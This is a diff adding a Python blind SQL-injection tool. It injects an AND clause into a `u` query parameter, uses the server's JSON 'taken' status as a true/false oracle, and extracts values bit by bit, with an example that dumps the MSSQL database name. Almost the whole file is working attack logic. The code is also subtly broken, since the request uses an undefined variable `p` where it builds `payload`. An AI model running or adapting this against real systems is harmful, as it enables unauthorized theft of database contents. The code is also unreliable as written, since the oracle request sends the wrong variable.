@@ -1,0 +1,64 @@
+#!/usr/bin/python3
+
+import requests
+import requests
+import json
+import sys
+from urllib.parse import quote_plus
+
+
+TARGET = "https://localhost/"
+
+
+# Condition is an existing condition, depending on the application, 
+# that must exist, in order for both parts of the AND expression to evaluate to true.
+# This could be a user name, existing ID, ..
+condition = 'admin'
+
+
+# Evalutes `q` on the server side and returns `true` or `false`
+def oracle(q):
+    payload = quote_plus(f"{condition}' AND ({q})-- -")
+    r = requests.get(
+        f"{TARGET}?u={p}"
+    )
+    j = json.loads(r.text)
+    return j['status'] == 'taken'
+
+
+# Verify that the oracle works by checking if the correct
+# values are returned for queries `1=1` and `1=0`
+print("[*] Starting Oracle")
+assert oracle("1=1")
+assert not oracle("1=0")
+print("[*] Oracle verified")
+
+
+def dumpNumber(substatement):
+    print(f"[*] Guessing Length of {substatement}:")
+    length = 0
+    for p in range(7):
+        if oracle(f"({substatement})&{2**p}>0"):
+            length |= 2**p
+    print(f"[*] Length = {length}")
+    return length
+
+
+def dumpString(substatement, length):
+    print(f"[*] Guessing Name of {substatement}:")
+    val = ""
+    for i in range(1, length + 1):
+        c = 0
+        for p in range(7):
+            if oracle(f"ASCII(SUBSTRING(({substatement}),{i},1))&{2**p}>0"):
+                c |= 2**p
+        val += chr(c)
+    print(f"[*] Name = {val}")
+    return val
+
+
+# Example usage:
+print("\n== Guessing Name of Database ==")
+db_name_length = dumpNumber("LEN(DB_NAME())")
+db_name = dumpString("DB_NAME()", db_name_length)
+
